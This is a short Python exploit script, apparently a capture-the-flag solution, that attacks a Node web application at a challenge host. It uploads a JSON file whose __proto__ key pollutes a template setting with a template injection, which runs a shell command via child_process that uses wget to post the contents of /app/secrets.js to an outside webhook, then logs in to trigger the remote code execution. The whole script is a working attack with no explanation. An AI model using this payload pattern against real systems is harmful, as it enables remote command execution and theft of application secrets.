import requests
import json
import random
import string

url = "http://61ae27ae-5821-45b3-ac02-c23e1afb02c5.challs.nusgreyhats.org/"
s = requests.Session()

webhook = 'https://krdgvmn.request.dreamhack.games'

payload = [
    {
        "lcUsername": "alice",
        "__proto__": {
            'userAutoCreateTemplate': '${JSON.stringify({username: require("child_process").execSync(`wget --post-data="$(cat /app/secrets.js)" %s`).toString() })}' % webhook
        }
    }
]

res = s.post(
    f"{url}/upload/users",
    files={
        "upload-users": ("pp.json", json.dumps(payload), "application/json")
    }
)

print("> Polluted")

def rand_str():
    return ''.join(random.sample(string.ascii_letters, 5))

res = s.post(
    f"{url}/login",
    data={
        "username": rand_str(),
        "password": rand_str() + '123'
    }
)

print("> RCE")